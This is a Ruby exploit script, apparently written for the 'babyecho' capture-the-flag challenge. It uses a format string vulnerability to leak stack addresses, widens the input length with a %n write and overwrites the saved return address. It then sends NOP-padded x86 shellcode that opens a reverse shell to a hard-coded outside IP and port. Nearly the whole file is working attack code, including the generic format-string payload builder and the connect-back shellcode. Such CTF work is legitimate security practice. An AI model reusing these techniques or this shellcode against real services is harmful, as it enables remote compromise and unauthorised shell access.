require 'socket'

HOST = 'localhost'

#HOST = 'babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me'
PORT = 3232

IPADDR = "\xce\xdc\xc4\x3b"
PORTNO = "\x44\x44"
SHELLCODE = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68" + "\xce\xdc\xc4\x3b" + "\x66\x68"+"\x44\x44"+"\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

s = TCPSocket.new(HOST, PORT)

def crash(s)
  s.write("AAAA %7$n\n")
end

# Reads and parses a single offset off the stack
def read_offset(s, offset)
  starting = s.recv(17) # "Reading 13 characters"
  if(starting !~ /Reading .* bytes\x0a/m)
    puts("Uh oh (1)!")
    puts(starting.unpack("H*"))
    puts(" => " + starting)
    exit
  end

  str = "%#{offset}$08x"
  s.write(str + "\n")

  result = s.recv(8)

  ending = s.recv(1)
  if(ending != "\x0a")
    puts("Uh oh (2)!")
    puts(ending.unpack("H*"))
    exit
  end

  return result.to_i(16)
end

def leak(s, addr, bytes = 1000000)
  starting = s.recv(17) # "Reading 13 characters"
  if(starting !~ /Reading .* bytes\x0a/m)
    puts("Uh oh (3)!")
    puts(starting.unpack("H*"))
    exit
  end

  str = "#{[addr].pack("V")}%7$s"
  s.write(str + "\n")

  result = s.recv(1024)

  ending = s.recv(1)
  if(ending != "\x0a")
    puts("Uh oh (4)!")
    puts(ending.unpack("H*"))
    puts(ending)
    exit
  end

  return result[4, bytes]
end

# Leaks exactly a certain number of bytes using %s, handling NUL bytes
def leak_exactly(s, addr, bytes)
  result = ""
  while(result.length < bytes)
    result += leak(s, addr + result.length, bytes - result.length)
    if(result.length < bytes)
      result += "\0"
    end
  end

  return result
end

# Leaks an address from the stack
def leak_address(s, addr)
  return leak_exactly(s, addr, 4).unpack("V").pop
end

# writes are a hashtable, key = address, value = value
def create_exploit(writes, starting_offset, prefix = "")
  index = starting_offset
  str = prefix

  addresses = []
  values = []
  writes.keys.sort.each do |k|
    addresses << k
    values << writes[k]
  end
  addresses.each do |a|
    str += [a, a+1, a+2, a+3].pack("VVVV")
  end

  len = str.length

  values.each do |v|
    a = (v >>  0) & 0x0FF
    b = (v >>  8) & 0x0FF
    c = (v >> 16) & 0x0FF
    d = (v >> 24) & 0x0FF

    [a, b, c, d].each do |val|
      count = 257
      len  += 1
      while((len & 0x0FF) != val)
        len   += 1
        count += 1
      end

      str += "%#{count}x"
      str += "%#{index}$n"
      index += 1
    end
  end

  puts("Generated a #{str.length}-byte format string exploit:")
  puts(str)
  puts(str.unpack("H*"))

  return str
end

# Get a stack address
frame_address = read_offset(s, 178)
puts("frame = 0x%08x" % frame_address)

# Get some offsets from that stack address (calculated using gdb)
length_address = frame_address - 0x358
puts("length address = 0x%08x" % length_address)

buffer_address = frame_address - 0x34c
puts("buffer address = 0x%08x" % buffer_address)

return_address = frame_address - 0x36c
puts("return address = 0x%08x" % return_address)

# Change the number of bytes being read at once from 13 to 1023
s.write([length_address+1].pack("V") + "%99x%7$n\n")
s.recv(1024)

# I was originally going to use mprotect for ROP to make the stack executable,
# but that turned out to be unnecessary
#mprotect(addr, len, mode)
#mprotect_addr = 0x0806DFD0

sploit = create_exploit({
  return_address + 0x00 => buffer_address + 800,
# The stuff below were parameters to mprotect()
#  return_address + 0x04 => 0x64646464,
#  return_address + 0x08 => 7,
#  return_address + 0x0c => buffer_address & 0xFFFFF000,
#  return_address + 0x10 => 0x2000
}, 7)

# Pad the exploit with NUL bytes
while(sploit.length < 900)
  sploit += "\x90"
end

# Add the shellcode
sploit += SHELLCODE

# Send the exploit
s.write(sploit + "\n")
s.recv(1024)
